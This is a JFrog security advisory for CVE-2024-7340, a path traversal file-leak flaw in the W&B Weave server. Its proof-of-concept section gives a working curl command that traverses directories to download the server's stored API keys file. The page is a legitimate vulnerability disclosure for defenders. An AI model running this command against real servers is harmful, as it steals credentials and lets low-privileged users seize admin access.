
[![JFrog Security Research](/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg)](/)JFrog Security Research

* [Discover](/vulnerabilities/)
* [Follow JFrog Security
  ![twitter](/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg)](https://twitter.com/JFrogSecurity)
![Menu](/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg)![Menu](data:image/svg+xml...)![Menu](/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg)

* [Home](/)
* [Discover](/vulnerabilities/)
* [Follow JFrog Security](https://twitter.com/JFrogSecurity)
[< Back](/vulnerabilities/)
# JFSA-2024-001039248 - W&B Weave server remote arbitrary file leak

CVE-2024-7340
| CVSS 8.8

 JFrog Severity:high

Discovered By**Natan Nehorai and Uriya Yavnieli**of the JFrog Security Research Team

Published 31 Jul, 2024 | Last updated 31 Jul, 2024

## [Summary](#summary)

W&B Weave server remote arbitrary file leak and privilege escalation

## [Component](#component)

weave

## [Affected versions](#affected-versions)

(,0.50.7]

## [Description](#description)

The Weave server API allows remote users to fetch files from a specific directory, but due to a lack of input validation, it is possible to traverse and leak arbitrary files remotely. In various common scenarios, this allows a low-privileged user to assume the role of the server admin.

## [PoC](#poc)

```
export WANDB=<WANDB SESSION COOKIE>
export WANDB_SSO=<WANDB SSO SESSION COOKIE>
export SERVER_IP=<WANDB SERVER IP>

curl -s --path-as-is --cookie "wandb=$WANDB; wandb_sso=$WANDB_SSO" "http://$SERVER_IP:8080/__weave/file/vol/weave/cache/../../../vol/mysql/wandb_local/api_keys.ibd" --output apikeys.bin

```
## [Vulnerability Mitigations](#vulnerability-mitigations)

No mitigations are supplied for this issue

## [References](#references)

[Vendor fix](https://github.com/wandb/weave/pull/1657)

[< Back](/vulnerabilities/)[![JFrog Security Research](/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg)](/)

* [Terms of Use](https://jfrog.com/terms-of-use/)
* [Cookies Policy](https://jfrog.com/jfrog-cookies-policy/)
* [Privacy Policy](https://jfrog.com/privacy-policy/)
* Cookies Settings

Â©2025 All Rights Reserved. JFrog Ltd.

